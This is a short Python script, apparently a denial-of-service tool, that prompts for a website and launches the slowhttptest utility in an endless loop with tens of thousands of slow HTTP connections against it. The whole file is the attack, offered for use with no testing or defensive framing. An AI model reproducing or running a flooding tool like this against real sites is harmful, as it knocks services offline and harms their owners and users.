import os

def ddos(url):
    site_url = url.strip()
    while True:
        run = os.system("slowhttptest -c 65539 -H -g -o slowhttp -i 10 -r 200 -t GET -u {site_url} -x 676256 -p 3".format(
                    site_url=site_url
                ))
if __name__ == "__main__":
    url = input("Enter site name: ")
    ddos(url)

